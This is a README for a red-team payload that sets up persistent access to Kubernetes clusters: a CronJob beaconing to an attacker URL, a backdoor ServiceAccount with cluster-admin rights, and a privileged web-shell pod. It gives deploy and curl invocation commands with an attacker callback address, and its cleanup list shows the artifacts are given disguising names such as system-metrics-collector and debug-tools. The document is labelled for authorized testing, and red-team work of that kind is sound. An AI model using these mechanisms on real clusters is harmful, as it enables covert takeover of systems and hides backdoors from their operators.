# Payload: Persistence

⚠️ **AUTHORIZED TESTING ONLY**

## Description

LambdaFunction CRDs that establish persistent access to Kubernetes clusters.

## Variants

| Name | Description | Severity |
|------|-------------|----------|
| `payload-persistence-full` | All mechanisms (CronJob, SA, WebShell) | CRITICAL |
| `payload-persistence-cronjob` | Beacon CronJob only | HIGH |
| `payload-persistence-backdoor-sa` | Backdoor ServiceAccount only | CRITICAL |

## Mechanisms

### 1. Beacon CronJob
Creates a CronJob that periodically calls back to attacker server.

### 2. Backdoor ServiceAccount
Creates a ServiceAccount with cluster-admin privileges.

### 3. Web Shell Pod
Creates a privileged pod with host network/PID access.

## Usage

```bash
# Deploy
kubectl apply -f persistence.yaml -n redteam-test

# Invoke full persistence
curl -X POST http://payload-persistence-full.redteam-test.svc.cluster.local \
  -H "Content-Type: application/json" \
  -d '{
    "attacker_url": "http://10.0.0.100:8888",
    "namespace": "default",
    "beacon_interval": "*/5 * * * *"
  }'

# Selective mechanisms
curl -X POST http://payload-persistence-full.redteam-test.svc.cluster.local \
  -H "Content-Type: application/json" \
  -d '{
    "attacker_url": "http://10.0.0.100:8888",
    "mechanisms": ["cronjob", "backdoor_sa"]
  }'
```

## Event Payload

```json
{
  "attacker_url": "http://10.0.0.100:8888",
  "namespace": "default",
  "beacon_interval": "*/5 * * * *",
  "mechanisms": ["cronjob", "backdoor_sa", "web_shell"]
}
```

## Cleanup

```bash
# Remove persistence artifacts
kubectl delete cronjob system-metrics-collector -n default
kubectl delete sa system-admin -n default
kubectl delete clusterrole system-admin-role
kubectl delete clusterrolebinding system-admin-binding
kubectl delete pod debug-tools -n default
```
